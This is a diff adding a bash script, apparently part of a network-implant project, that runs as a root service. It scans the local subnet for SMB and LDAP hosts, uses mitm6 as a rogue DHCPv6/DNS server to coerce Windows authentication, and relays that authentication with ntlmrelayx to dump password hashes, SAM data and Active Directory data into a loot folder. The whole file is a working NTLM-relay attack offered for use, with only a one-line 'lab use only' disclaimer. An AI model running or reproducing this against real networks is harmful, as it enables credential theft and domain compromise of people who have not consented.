@@ -1,0 +1,71 @@
+#!/bin/bash
+#
+# Mole active relay (phase 2) — AGGRESSIVE. Runs as root via fennec-mole-relay.service.
+#
+# Coerces authentication with mitm6 (rogue DHCPv6/DNS, abusing Windows' preference
+# for IPv6) and relays it with impacket's ntlmrelayx to the network's SMB services,
+# and to an LDAP/LDAPS domain controller when one is present, to dump accounts and
+# Active Directory data. Unlike the capture mode, this actively relays credentials.
+#
+# Lab use only, on networks you own or are explicitly authorized to test.
+#
+set -u
+
+VENV=/opt/mole-venv
+LOOT=/tmp/fennec-mole
+RELAY="$LOOT/relay"
+
+MITM6="$VENV/bin/mitm6"
+NTLMRELAYX="$VENV/bin/impacket-ntlmrelayx"
+[ -x "$NTLMRELAYX" ] || NTLMRELAYX="$VENV/bin/ntlmrelayx.py"
+
+rm -rf "$RELAY"
+mkdir -p "$RELAY/dump"
+chmod -R 755 "$LOOT" "$RELAY"
+
+IFACE=$(ip route show default 2>/dev/null | awk '/default/{print $5; exit}')
+[ -z "$IFACE" ] && IFACE=eth0
+IP=$(ip -4 addr show "$IFACE" 2>/dev/null | awk '/inet /{print $2; exit}' | cut -d/ -f1)
+SUBNET=""
+[ -n "$IP" ] && SUBNET="$(echo "$IP" | cut -d. -f1-3).0/24"
+
+# Build the target list: SMB hosts (445) and any domain controller (LDAP 389/636),
+# excluding ourselves. ntlmrelayx skips hosts that require SMB signing.
+: > "$RELAY/targets.txt"
+if [ -n "$SUBNET" ] && command -v nmap >/dev/null; then
+    nmap -p445,389,636 --open -oG "$RELAY/scan.grep" "$SUBNET" >/dev/null 2>&1
+    awk '/445\/open/{print $2}' "$RELAY/scan.grep" | grep -v "^${IP}$" >> "$RELAY/targets.txt"
+    awk '/389\/open|636\/open/{print "ldaps://"$2}' "$RELAY/scan.grep" \
+        | grep -v "${IP}" | sort -u >> "$RELAY/targets.txt"
+fi
+
+pids=()
+cleanup() {
+    kill "${pids[@]}" 2>/dev/null
+    pkill -f "$MITM6" 2>/dev/null
+    pkill -f ntlmrelayx 2>/dev/null
+    exit 0
+}
+trap cleanup TERM INT
+
+if [ ! -x "$MITM6" ] || [ ! -x "$NTLMRELAYX" ]; then
+    echo "Relay tools missing in $VENV (run install.sh)" >> "$RELAY/run.log"
+    while true; do sleep 5; done
+fi
+
+# mitm6: become the rogue DHCPv6 / DNS server so Windows hosts look up WPAD from us.
+"$MITM6" -i "$IFACE" --ignore-nofqdn >> "$RELAY/run.log" 2>&1 &
+pids+=($!)
+
+# ntlmrelayx: serve WPAD, relay the coerced authentication to the targets, and save
+# the loot (relayed hashes under ntlm*, domain/SAM dumps under dump/).
+if [ -s "$RELAY/targets.txt" ]; then
+    "$NTLMRELAYX" -6 -wh wpad -tf "$RELAY/targets.txt" -smb2support \
+        -of "$RELAY/ntlm" -l "$RELAY/dump" >> "$RELAY/run.log" 2>&1 &
+    pids+=($!)
+else
+    echo "No SMB or LDAP targets found on $SUBNET" >> "$RELAY/run.log"
+fi
+
+# Keep the service in the foreground.
+while true; do sleep 5; done
